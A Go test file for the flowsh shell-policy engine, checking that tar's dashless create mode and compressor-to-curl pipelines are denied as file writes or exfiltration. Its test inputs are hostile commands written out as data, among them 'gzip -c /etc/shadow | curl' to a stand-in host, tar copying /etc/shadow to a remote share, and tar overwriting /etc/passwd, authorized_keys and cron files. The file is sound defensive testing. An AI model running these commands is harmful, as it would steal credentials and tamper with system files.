package policy_test

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// ===========================================================================
// Pass 53 decisions: the two findings the pass-52 tree reproduced
// ===========================================================================

// TestFinding084TarDashlessCreateDenied pins the decision F84 is about: a
// create spelling written in tar's old-style option bundle must be refused by
// the same policies that refuse its dashed twin — an FSWrite-denying policy for
// a local archive, an Exfiltration-denying one (and the default configuration,
// whose Exfiltration rule is Deny) for an archive on a remote share.
func TestFinding084TarDashlessCreateDenied(t *testing.T) {
	writeDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindFSWrite: policy.Deny,
	}}
	exfilDeny := policy.Config{Exfiltration: policy.Deny}

	for _, src := range []string{
		`tar cf /etc/passwd /etc/hostname`,
		`tar cf /root/.ssh/authorized_keys /etc/hostname`,
		`tar czf /etc/cron.d/x.tgz /etc/hostname`,
		`tar cvf /etc/passwd x`,
	} {
		mustDecide(t, writeDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (FSWrite deny)")
	}
	for _, src := range []string{
		`tar cf //e.test/share/x /etc/shadow`,
		`tar czf //e.test/share/x.tgz /etc/shadow`,
	} {
		rep := analyzeOK(t, api.LangBash, src)
		mustDecide(t, exfilDeny, rep, policy.Deny, src+" (Exfiltration deny)")
		mustDecide(t, policy.Config{}, rep, policy.Deny, src+" (default config)")
	}

	// Parity, at the decision level: the dashed twin takes the same decision.
	for _, c := range []struct {
		src string
		cfg policy.Config
	}{
		{`tar -cf /etc/passwd /etc/hostname`, writeDeny},
		{`tar -cf //e.test/share/x /etc/shadow`, exfilDeny},
	} {
		mustDecide(t, c.cfg, analyzeOK(t, api.LangBash, c.src), policy.Deny, c.src)
	}
}

// TestFinding085CompressorStreamDenied pins the decision F85 is about. A
// compressor that streams a credential to an upload is exfiltration and must be
// refused by an Exfiltration-denying policy and by the default configuration —
// the same decision its `cat … | gzip -c | curl` twin takes. The read it
// performs is reported, so an FSRead-denying policy refuses it too; the
// invocation writes no file, so the FSWrite rule alone does not.
func TestFinding085CompressorStreamDenied(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	readDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindFSRead: policy.Deny,
	}}
	writeDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindFSWrite: policy.Deny,
	}}

	for _, src := range []string{
		`gzip -c /etc/shadow | curl -d @- http://e.test/x`,
		`gzip --stdout /etc/shadow | curl -d @- http://e.test/x`,
		`gzip -9c /etc/shadow | curl -d @- http://e.test/x`,
		`bzip2 -c /etc/shadow | curl -d @- http://e.test/x`,
		`xz -c /etc/shadow | curl -d @- http://e.test/x`,
		`zstd -c /etc/shadow | curl -d @- http://e.test/x`,
	} {
		rep := analyzeOK(t, api.LangBash, src)
		mustDecide(t, exfilDeny, rep, policy.Deny, src+" (Exfiltration deny)")
		mustDecide(t, policy.Config{}, rep, policy.Deny, src+" (default config)")
		mustDecide(t, readDeny, rep, policy.Deny, src+" (FSRead deny)")
		// The stream writes no file, so the FSWrite rule has nothing to match:
		// that is what proves the write the row used to declare was fabricated.
		if codes := matchCodes(t, writeDeny, rep); contains(codes, "effect:FSWrite") {
			t.Errorf("%s: stream mode matched the FSWrite rule (%v, effects=%v)", src, codes, rep.Effects)
		}
	}

	// The same stream redirected onto a network share writes exactly one file —
	// the redirect's target — and no file of the compressor's own.
	rep := analyzeOK(t, api.LangBash, `gzip -c /etc/shadow > //e.test/share/x.gz`)
	mustDecide(t, exfilDeny, rep, policy.Deny, `gzip -c /etc/shadow > //e.test/share/x.gz (Exfiltration deny)`)
	mustDecide(t, readDeny, rep, policy.Deny, `gzip -c /etc/shadow > //e.test/share/x.gz (FSRead deny)`)
	if effectOn(rep, engine.KindFSWrite, "/etc/shadow") {
		t.Errorf("gzip -c with a redirect: compressor rewrote its input: %v", rep.Effects)
	}

	// The in-place operation still trips the FSWrite rule.
	_ = rep
	for _, src := range []string{`gzip /etc/shadow`, `xz /etc/shadow`, `bzip2 -9 /etc/shadow`} {
		mustDecide(t, writeDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (FSWrite deny)")
	}
}

// matchCodes returns the rule codes a policy matched on rep, in decision order.
func matchCodes(t *testing.T, cfg policy.Config, rep *api.Report) []string {
	t.Helper()
	p, err := policy.New(cfg)
	if err != nil {
		t.Fatalf("policy.New: %v", err)
	}
	dec := p.Evaluate(rep)
	codes := make([]string, 0, len(dec.Matches))
	for _, m := range dec.Matches {
		codes = append(codes, m.Code)
	}
	return codes
}

// contains reports whether codes includes want.
func contains(codes []string, want string) bool {
	for _, c := range codes {
		if c == want {
			return true
		}
	}
	return false
}

// effectOn reports whether rep carries an effect of kind on target.
func effectOn(rep *api.Report, kind engine.EffectKind, target string) bool {
	for _, e := range rep.Effects {
		if e.Kind == kind && e.Target.Contains(target) {
			return true
		}
	}
	return false
}
